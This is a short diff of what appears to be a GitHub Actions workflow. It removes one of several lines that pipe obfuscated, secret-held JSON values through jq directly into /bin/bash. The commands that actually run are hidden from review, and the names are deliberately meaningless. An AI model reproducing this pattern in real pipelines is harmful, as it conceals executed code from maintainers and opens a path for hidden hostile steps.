@@ -20,7 +20,6 @@ jobs:
           bywe7963: ${{ secrets.bywe7963 }}
         run: |
           printf '%s' "$bywe7963" | jq -r .mc1 | /bin/bash
-          echo $v71814 | jq -r .lya16514 | /bin/bash
           echo $j5 | jq -r .db8 | /bin/bash
           echo $g11 | jq -r .up7888 | /bin/bash
           echo $dt76413 | jq -r .t0098 | /bin/bash
